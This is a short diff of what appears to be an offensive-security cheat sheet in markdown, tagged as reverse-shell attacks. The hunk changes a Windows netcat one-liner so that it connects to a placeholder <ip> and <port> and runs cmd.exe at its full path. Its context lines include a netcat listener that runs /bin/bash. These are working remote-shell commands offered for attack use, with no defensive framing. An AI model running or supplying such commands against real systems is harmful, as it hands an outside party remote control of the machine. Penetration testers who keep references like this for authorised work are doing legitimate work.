@@ -23,8 +23,10 @@ nc -nlvp <port> -e /bin/bash
 ## nc reverse shell windows
 #plateform/windows  #cat/ATTACK/REVERSE_SHELL 
 ```
-nc -nv <ip> <port> -e cmd.exe
+nc -nv <ip> <port> -e c:\windows\system32\cmd.exe
 ```
+
+
 
 ## nc reverse shell linux
 #plateform/linux #cat/ATTACK/REVERSE_SHELL 
